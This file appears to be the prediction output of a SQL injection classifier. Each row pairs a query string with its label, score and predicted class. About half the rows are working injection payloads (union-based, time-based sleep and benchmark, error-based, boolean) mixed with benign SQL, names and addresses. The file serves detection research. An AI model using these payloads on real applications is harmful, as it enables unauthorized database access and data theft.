Query,Label,RawMargin,Prob_Raw,Pred_Default,Pred_BestThr,BestThr,BestThr_Margin
"1%'   )    )     )   and elt  (  7425  =  3843,3843  )   and    (    (     (  '%'  =  '",1,12.893439292907715,0.9999974966049194,1,1,0.51,0.040005334613699206
-2981   )    )    or   (  8459  =  8459  )  *4906 and    (    (   4202  =  4202,1,11.907607078552246,0.9999932050704956,1,1,0.51,0.040005334613699206
moriego,0,-5.43983793258667,0.0043214308097958565,0,0,0.51,0.040005334613699206
"1%""  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,12.31721305847168,0.9999954700469971,1,1,0.51,0.040005334613699206
1  )   as nxmd where 8650  =  8650,1,6.757795810699463,0.9988395571708679,1,1,0.51,0.040005334613699206
SELECT COUNT ( wonder ) FROM use,0,-10.424123764038086,2.9706239729421213e-05,0,0,0.51,0.040005334613699206
"1' and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and 'tmwy'  =  'tmwy",1,11.967399597167969,0.9999936819076538,1,1,0.51,0.040005334613699206
follosas,0,-4.962100982666016,0.006949575152248144,0,0,0.51,0.040005334613699206
"1'  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1,7.7187628746032715,0.999555766582489,1,1,0.51,0.040005334613699206
SELECT laugh FROM angry,0,-11.48166275024414,1.0317459782527294e-05,0,0,0.51,0.040005334613699206
60201082p,0,-9.263940811157227,9.477209096075967e-05,0,0,0.51,0.040005334613699206
"iif  (  9342  =  6508,1,1/0  )  ",1,6.247678279876709,0.9980688691139221,1,1,0.51,0.040005334613699206
SELECT AVG ( brief ) FROM forget SELECT SUM ( fast ) ,0,-9.584894180297852,6.875487451907247e-05,0,0,0.51,0.040005334613699206
"SELECT customername, contactname FROM customers; ALTER TABLE Customers ADD Email varchar ( 255 ) ; ALTER TABLE Customers DROP COLUMN Email; DROP TABLE Shippers;  TRUNCATE TABLE Categories;",0,-5.813173294067383,0.0029790319968014956,0,0,0.51,0.040005334613699206
"1'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'iixp'  =  'iixp",1,9.5917329788208,0.9999316930770874,1,1,0.51,0.040005334613699206
"1%""   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",1,14.433446884155273,0.9999994039535522,1,1,0.51,0.040005334613699206
"1,  (  select   (  case when   (  5141  =  5141  )   then   (  ascii  (  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )     )   else 5141/  (  select 0 from   (  values  (  0   )    )     )   end  )   from   (  values  (  0   )    )     )  ",1,6.849860191345215,0.9989414811134338,1,1,0.51,0.040005334613699206
-9875'  )   or   (  8459  =  8459  )  *4906 and   (  'mrxw'  =  'mrxw,1,12.44230842590332,0.9999960660934448,1,1,0.51,0.040005334613699206
"-6389"" union all select 2355,2355,2355,2355,2355--",1,13.358792304992676,0.9999984502792358,1,1,0.51,0.040005334613699206
"   SELECT weak, bound+ ', ' + vessels+ ' ' + cage+ ', ' + pole AS union  FROM highway",0,-10.336187362670898,3.243670653318986e-05,0,0,0.51,0.040005334613699206
2308,0,-4.683781623840332,0.009159321896731853,0,0,0.51,0.040005334613699206
1.21588E+15,0,-8.801640510559082,0.00015046335465740412,0,0,0.51,0.040005334613699206
"1""   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   ""iuxs"" like ""iuxs",1,11.28794002532959,0.9999874830245972,1,1,0.51,0.040005334613699206
adolphe,0,-5.43983793258667,0.0043214308097958565,0,0,0.51,0.040005334613699206
" end and ""xlvn""  =  ""xlvn",1,3.7147746086120605,0.9762184619903564,1,1,0.51,0.040005334613699206
26707809w,0,-9.263940811157227,9.477209096075967e-05,0,0,0.51,0.040005334613699206
86943454g,0,-9.263940811157227,9.477209096075967e-05,0,0,0.51,0.040005334613699206
"1%""  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,12.784751892089844,0.9999971389770508,1,1,0.51,0.040005334613699206
SELECT TOP 50 PERCENT * FROM combination,0,-8.818570137023926,0.00014793786976952106,0,0,0.51,0.040005334613699206
"1""   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""nevr"" like ""nevr",1,12.052312850952148,0.999994158744812,1,1,0.51,0.040005334613699206
SELECT TOP 3 * FROM hardly WHERE interior = 'cannot',0,-10.123811721801758,4.011132841696963e-05,0,0,0.51,0.040005334613699206
SELECT * FROM now  WHERE therefore NOT LIKE '[learn]%',0,-10.169604301452637,3.8316014979500324e-05,0,0,0.51,0.040005334613699206
alconchel,0,-5.873077392578125,0.002806302160024643,0,0,0.51,0.040005334613699206
-6327'   )    )    union all select 2685--,1,12.02297592163086,0.9999940395355225,1,1,0.51,0.040005334613699206
07951538r,0,-9.263940811157227,9.477209096075967e-05,0,0,0.51,0.040005334613699206
1'+  (  select 'wsjk' where 3291  =  3291,1,8.777693748474121,0.9998458623886108,1,1,0.51,0.040005334613699206
select * from users where id  =  1 + \+%1 or 1  =  1 -- 1,1,9.797195434570312,0.9999444484710693,1,1,0.51,0.040005334613699206
exec  (  @s  ) ,1,3.4732284545898438,0.9699164032936096,1,1,0.51,0.040005334613699206
geffner-schoo@bacoespecialseleccin.bm,0,-10.547290802001953,2.626384775794577e-05,0,0,0.51,0.040005334613699206
SELECT * FROM agree WHERE impossible = 'fur',0,-10.764344215393066,2.1139539967407472e-05,0,0,0.51,0.040005334613699206
"1'  )   where 3703  =  3703 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,8.763876914978027,0.9998437166213989,1,1,0.51,0.040005334613699206
SELECT * FROM breeze FETCH FIRST 3 ROWS ONLY,0,-12.045361518859863,5.871694156667218e-06,0,0,0.51,0.040005334613699206
"1"" where 8672  =  8672 union all select null,null#",1,8.71395206451416,0.999835729598999,1,1,0.51,0.040005334613699206
SELECT TOP 3 * FROM heavy SELECT * FROM slept 3SELECT * FROM pleasant,0,-12.992847442626953,2.276549139423878e-06,0,0,0.51,0.040005334613699206
"  SELECT hospital AS double, saved AS [desk]  FROM musical",0,-12.949298858642578,2.3778798095008824e-06,0,0,0.51,0.040005334613699206
SELECT * FROM port WHERE goes NOT BETWEEN 'some' AND 'underline',0,-13.76421070098877,1.052637344400864e-06,0,0,0.51,0.040005334613699206
"SELECT wp_posts.* FROM wp_posts LEFT JOIN wp_postmeta ON  (  wp_posts.ID  =  wp_postmeta.post_id AND wp_postmeta.meta_key  =  'fave_agent_visible'  )  LEFT JOIN wp_postmeta AS mt1 ON  (  wp_posts.ID  =  mt1.post_id  )  WHERE 1 = 1 AND wp_posts.ID NOT IN  ( 28313,28341 )  AND  (  wp_postmeta.post_id IS NULL OR  (  mt1.meta_key  =  'fave_agent_visible' AND CAST ( mt1.meta_value AS SIGNED )  ! =  '1'  )   )  AND wp_posts.post_type  =  'houzez_agent' AND   (  (  wp_posts.post_status  =  'publish'  )  )   GROUP BY wp_posts.ID ORDER BY wp_posts.post_title ASC",0,-1.6397486925125122,0.16249926388263702,0,0,0.51,0.040005334613699206
"calle pea 49, 9?b",0,-7.783689022064209,0.0004162995901424438,0,0,0.51,0.040005334613699206
-4248 where 3288  =  3288 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1,9.170745849609375,0.9998959302902222,1,1,0.51,0.040005334613699206
SELECT * FROM accurate WHERE branch BETWEEN 'handsome' AND 'although',0,-14.330707550048828,5.973825523142295e-07,0,0,0.51,0.040005334613699206
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   'xaoi'  =  'xaoi",1,11.845976829528809,0.999992847442627,1,1,0.51,0.040005334613699206
"1   )    )     )   union all select null,null,null,null,null--",1,9.943614959716797,0.999951958656311,1,1,0.51,0.040005334613699206
abs hosta,0,-5.255996227264404,0.005189080256968737,0,0,0.51,0.040005334613699206
08109487d,0,-9.263940811157227,9.477209096075967e-05,0,0,0.51,0.040005334613699206
SELECT string FROM boy UNION SELECT bit FROM occur ORDER BY theory,0,-12.105113983154297,5.531123861146625e-06,0,0,0.51,0.040005334613699206
"1""   )    )     )   union all select null,null--",1,10.793912887573242,0.9999794960021973,1,1,0.51,0.040005334613699206
ges,0,-2.9969239234924316,0.0475650317966938,0,0,0.51,0.040005334613699206
SELECT thy ( s )  FROM engine UNION,0,-8.570572853088379,0.0001895680616144091,0,0,0.51,0.040005334613699206
"-4025"" or 3038  =  3038",1,8.742940902709961,0.9998403787612915,1,1,0.51,0.040005334613699206
SELECT TOP 50 PERCENT * FROM settle SELECT * FROM blank FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM somehow,0,-9.680502891540527,6.248616409720853e-05,0,0,0.51,0.040005334613699206
arima@hormigon-impreso.nu,0,-11.760747909545898,7.80492428020807e-06,0,0,0.51,0.040005334613699206
"  SELECT BINARY ""HELLO""  =  ""hello"";",0,-7.819525718688965,0.00040165084647014737,0,0,0.51,0.040005334613699206
almedina,0,-4.962100982666016,0.006949575152248144,0,0,0.51,0.040005334613699206
-6412%' or 4065  =  5815 and '%'  =  ',1,9.309063911437988,0.9999094009399414,1,1,0.51,0.040005334613699206
"-1816""  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""dztr"" like ""dztr",1,9.030957221984863,0.999880313873291,1,1,0.51,0.040005334613699206
"-6145'+  (  select nnjn where 1389  =  1389 union all select 1389,1389,1389--",1,11.65223217010498,0.9999912977218628,1,1,0.51,0.040005334613699206
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gtcb'  =  'gtcb",1,10.967123031616211,0.9999827146530151,1,1,0.51,0.040005334613699206
DELETE FROM shinning,0,-12.007055282592773,6.100978225731524e-06,0,0,0.51,0.040005334613699206
SELECT TOP 3 * FROM race,0,-9.476567268371582,7.662065036129206e-05,0,0,0.51,0.040005334613699206
angeles jarama,0,-8.861528396606445,0.00014171817747410387,0,0,0.51,0.040005334613699206
"1'   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   'vcvj'  =  'vcvj",1,8.489631652832031,0.9997944235801697,1,1,0.51,0.040005334613699206
SELECT option_value FROM wp_options WHERE option_name  =  'amp-options' LIMIT 1,0,-11.701746940612793,8.279273970401846e-06,0,0,0.51,0.040005334613699206
" SELECT Employees.LastName, COUNT ( Orders.OrderID )  AS NumberOfOrders FROM Orders INNER JOIN Employees ON Orders.EmployeeID  =  Employees.EmployeeID WHERE LastName  =  'Davolio' OR LastName  =  'Fuller' GROUP BY LastName HAVING  COUNT ( Orders.OrderID )  > 25;",0,4.194258213043213,0.985142171382904,1,1,0.51,0.040005334613699206
arrazua-ubarrundia,0,-15.655537605285645,1.5881310844179097e-07,0,0,0.51,0.040005334613699206
SELECT AVG ( indicate )  FROM quietly  SELECT SUM ( smooth ) ,0,-12.051985740661621,5.8329269450041465e-06,0,0,0.51,0.040005334613699206
"SELECT t.*, tt.* FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id  =  tt.term_id WHERE t.term_id  =  2710",0,-7.330056667327881,0.0006551069673150778,0,0,0.51,0.040005334613699206
"c/ afluente, 82",0,-8.078531265258789,0.00031003003823570907,0,0,0.51,0.040005334613699206
67663365x,0,-9.263940811157227,9.477209096075967e-05,0,0,0.51,0.040005334613699206
1  )   where 2307  =  2307,1,9.405494689941406,0.99991774559021,1,1,0.51,0.040005334613699206
"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  ",1,6.556551933288574,0.9985812902450562,1,1,0.51,0.040005334613699206
"1,updatexml  (  2917,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  2917  =  2917,1   )    )     )  ,0x717a767a71  )  ,8295  )  ",1,7.434048652648926,0.999409556388855,1,1,0.51,0.040005334613699206
"  UPDATE women SET baseball =  'person', City =  'traffic' WHERE small =  boat",0,-10.127734184265137,3.995430961367674e-05,0,0,0.51,0.040005334613699206
SELECT option_value FROM wp_options WHERE option_name  =  'can_compress_scripts' LIMIT 1,0,-10.247187614440918,3.545582148944959e-05,0,0,0.51,0.040005334613699206
03621656f,0,-9.263940811157227,9.477209096075967e-05,0,0,0.51,0.040005334613699206
"-7146"" where 6431  =  6431 or 8548  =  5549--",1,11.97506332397461,0.9999936819076538,1,1,0.51,0.040005334613699206
"-4944%""   )    )    or make_set  (  1084  =  1988,1988  )   and    (    (   ""%""  =  """,1,10.262248039245605,0.9999650716781616,1,1,0.51,0.040005334613699206
SELECT MIN ( occasionally )  AS courage FROM current,0,-14.284957885742188,6.253474111872492e-07,0,0,0.51,0.040005334613699206
SELECT hay ( s )  FROM congress UNION,0,-9.646238327026367,6.466419290518388e-05,0,0,0.51,0.040005334613699206
" select * from users where id  =  1 or ""_{"" or 1  =  1 -- 1",1,8.746728897094727,0.9998409748077393,1,1,0.51,0.040005334613699206
"1%""   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,12.101227760314941,0.9999943971633911,1,1,0.51,0.040005334613699206
"-5726%""   )    )    or 6872  =  6872 and    (    (   ""%""  =  """,1,7.535836696624756,0.9994667172431946,1,1,0.51,0.040005334613699206
31587,0,-7.913724422454834,0.00036555639235302806,0,0,0.51,0.040005334613699206
"-6249'   )    )     )   union all select 5136,5136,5136,5136,5136,5136,5136,5136,5136--",1,13.818800926208496,0.9999990463256836,1,1,0.51,0.040005334613699206
1  )   as cinw where 3732  =  3732 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,12.865985870361328,0.9999973773956299,1,1,0.51,0.040005334613699206
select   (  case when   (  5569  =  9390  )   then 5569 else 1/  (  select 0  )   end  )  --,1,10.610079765319824,0.999975323677063,1,1,0.51,0.040005334613699206
SELECT * FROM simply WHERE settle = 'another'  AND City = 'nation',0,-11.915773391723633,6.684092568320921e-06,0,0,0.51,0.040005334613699206
"1' in boolean mode  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  #",1,6.858141899108887,0.9989503026008606,1,1,0.51,0.040005334613699206
 UPDATE return SET camera = 'pond'WHERE of = 'such',0,-6.128363609313965,0.0021754028275609016,0,0,0.51,0.040005334613699206
houstin@maxitienda.zr,0,-9.032224655151367,0.00011948209430556744,0,0,0.51,0.040005334613699206
36930027p,0,-9.263940811157227,9.477209096075967e-05,0,0,0.51,0.040005334613699206
barlovento,0,-8.482161521911621,0.0002070876071229577,0,0,0.51,0.040005334613699206
1  )   and sleep  (  5  )  #,1,9.385950088500977,0.9999160766601562,1,1,0.51,0.040005334613699206
"SELECT * FROM grew WHERE speech BETWEEN ""favorite"" AND    ""vegetable""",0,-13.402129173278809,1.5119193221835303e-06,0,0,0.51,0.040005334613699206
SELECT * FROM result ORDER BY moving DESC,0,-10.772856712341309,2.0960358597221784e-05,0,0,0.51,0.040005334613699206
1'   )    )    and 3814  =  4272--,1,13.416069984436035,0.9999984502792358,1,1,0.51,0.040005334613699206
1  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,1,4.509396076202393,0.9891146421432495,1,1,0.51,0.040005334613699206
SELECT * FROM read WHERE slightly = 'remember' FETCH FIRST 3 ROWS ONLY,0,-15.248513221740723,2.3859138309489936e-07,0,0,0.51,0.040005334613699206
"1""   )    )    as nsbu where 6569  =  6569 or sleep  (  5  )  #",1,14.332952499389648,0.9999994039535522,1,1,0.51,0.040005334613699206
 (  8362  =  9139  )  *9139,1,11.733766555786133,0.9999920129776001,1,1,0.51,0.040005334613699206
"1'  )   as woka where 4316  =  4316 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,11.674796104431152,0.9999915361404419,1,1,0.51,0.040005334613699206
"-5245""   )    )     )   union all select 8106,8106,8106#",1,12.629120826721191,0.9999967813491821,1,1,0.51,0.040005334613699206
SELECT * FROM business WHERE shelter NOT LIKE 'feathers%',0,-13.722860336303711,1.0970768471452175e-06,0,0,0.51,0.040005334613699206
SELECT * FROM create  WHERE heading = send,0,-11.981391906738281,6.259575911826687e-06,0,0,0.51,0.040005334613699206
maggee,0,-4.914506912231445,0.007285862695425749,0,0,0.51,0.040005334613699206
gwenda,0,-4.914506912231445,0.007285862695425749,0,0,0.51,0.040005334613699206
SELECT TOP 50 PERCENT * FROM sort SELECT * FROM wind FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM chief,0,-9.17337417602539,0.00010375501733506098,0,0,0.51,0.040005334613699206
18347,0,-7.913724422454834,0.00036555639235302806,0,0,0.51,0.040005334613699206
cracoviano,0,-8.482161521911621,0.0002070876071229577,0,0,0.51,0.040005334613699206
" select * from users where id  =  1 + $+%1 union select null,@@VERSION -- 1",1,7.945697784423828,0.9996459484100342,1,1,0.51,0.040005334613699206
1 where 6494  =  6494 and 8463  =  2760,1,9.183907508850098,0.9998973608016968,1,1,0.51,0.040005334613699206
